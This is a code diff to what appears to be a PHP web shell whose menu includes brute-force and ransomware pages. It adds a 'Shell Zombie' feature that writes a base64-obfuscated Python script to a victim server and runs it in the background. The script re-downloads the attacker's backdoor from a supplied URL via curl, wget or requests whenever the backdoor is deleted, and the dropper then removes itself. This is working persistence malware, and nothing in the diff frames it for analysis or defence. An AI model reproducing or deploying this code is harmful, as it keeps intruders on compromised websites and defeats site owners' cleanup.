@@ -509,7 +509,7 @@ function getRankAlexa() {
 	$url 		= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
 	$content 	= simplexml_load_file("http://data.alexa.com/data?cli=10&url=$url");
 	
-	if(!$content->SD) return 0;
+	if(!$content->SD) return;
 
 	$data['global_rank'] 	= (int) $content->SD->POPULARITY->attributes()->TEXT;
 	$data['local_rank'] 	= (int) $content->SD->COUNTRY->attributes()->RANK;
@@ -1152,6 +1152,29 @@ function ransomware() {
 	}
 }
 
+function shellzombie()
+{
+	global $path;
+	
+	pages("shellzombie", ["Tools", "Shell Zombie"], array("{{PATH}}"), array($path));
+
+	if(isset($_POST["infect"])) {
+		$urlShell = $_POST["urlShell"];
+		$dirShell = $_POST["dirShell"];
+		$nameShell = $_POST["nameShell"];
+
+		$nameZombie = substr(md5(mt_rand()), 0, 7).".py";
+		$infectFile = base64_decode("IyBhdXRvIGNyZWF0ZSBzaGVsbCB3aGVuIHNoZWxsIGdldCBkZWxldGUKIyBjb2RlZCBieSBSaXpzeWFkIEFSIC0geyBJbmRvU2VjIH0KIyB0aGFua3MgdG8gcm9vdEB4LWtyeXB0MG4teAojIHJlZmVyZW5jZTogaHR0cHM6Ly9naXRodWIuY29tL1N5c3RlbU9mUGVrYWxvbmdhbi9hdXRvLWNyZWF0ZS1zaGVsbAoKZnJvbSBvcy5wYXRoIGltcG9ydCBleGlzdHMsIGpvaW4KZnJvbSBvcyBpbXBvcnQgc3lzdGVtCmZyb20gc3lzIGltcG9ydCBhcmd2CmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQoKZGVmIGNtZF9leGlzdHMoY21kKToKICAgIHJldHVybiBzdWJwcm9jZXNzLmNhbGwoInR5cGUgIiArIGNtZCwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkgPT0gMAoKZGVmIGRvd25sb2FkRmlsZSh1cmwsIGxva2FzaSwgbmFtZV9maWxlKToKICAgIGlmIGNtZF9leGlzdHMoImN1cmwiKToKICAgICAgICBzeXN0ZW0oJ2N1cmwge30gPiB7fScuZm9ybWF0KHVybCwgam9pbihsb2thc2ksIG5hbWVfZmlsZSkpKQogICAgZWxpZiBjbWRfZXhpc3RzKCJ3Z2V0Iik6CiAgICAgICAgc3lzdGVtKCJ3Z2V0IC1QIHt9IC1PIHt9IHt9Ii5mb3JtYXQobG9rYXNpLCBuYW1lX2ZpbGUsIHVybCkpCiAgICBlbHNlOgogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQodXJsKQoKICAgICAgICBhID0gb3Blbihqb2luKGxva2FzaSwgbmFtZV9maWxlKSwgJ2EnKSAjIGlmIGNvbW1hbmQgbm90IGZvdW5kIHVzaW5nIGxpYnJhcnkgcmVxdWVzdHMKICAgICAgICBhLndyaXRlKHIudGV4dCkKICAgICAgICBhLmNsb3NlKCkKCiAgICAKZGVmIG1haW4odXJsLCBkaXJfYmFja2Rvb3IsIG5hbWVfYmFja2Rvb3IpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBmaWxlID0gZXhpc3RzKGpvaW4oZGlyX2JhY2tkb29yLG5hbWVfYmFja2Rvb3IpKSAjIGlmIHRoZSBmaWxlIGlzIHN0aWxsIGVtYmVkZGVkCgogICAgICAgIGlmIGZpbGU6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKICAgICAgICAgICAgcGFzcwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRvd25sb2FkRmlsZSh1cmwsIGRpcl9iYWNrZG9vciwgbmFtZV9iYWNrZG9vcikKICAgICAgICAgICAgdGltZS5zbGVlcCg1KQogICAgICAgIAogICAgICAgIAp1cmwgPSBhcmd2WzFdCmxva2FzaSA9IGFyZ3ZbMl0KbmFtZV9maWxlID0gYXJndlszXQoKbWFpbih1cmwsIGxva2FzaSwgbmFtZV9maWxlKQ==");
+
+		$handle = @fopen("$dirShell/$nameZombie", "w");
+		fwrite($handle, $infectFile);
+		exe("python $dirShell/$nameZombie $urlShell $dirShell $nameShell >/dev/null 2>&1 &");
+		sleep(1);
+		unlink("$dirShell/$nameZombie");
+		swall("Success", "Success Infection Website", "success", current_path("shellzombie", $path));
+	}
+}
+
 if(isset($_GET["page"]))
 {
 	$page = $_GET["page"];
@@ -1179,6 +1202,7 @@ if(isset($_GET["page"]))
 	if($page == "console") console();
 	if($page == "adminer") adminer();
 	if($page == "network") network();
+	if($page == "shellzombie") shellzombie();
 	if($page == "bruteforce") bruteforce();
 	if($page == "ransomware") ransomware();
 
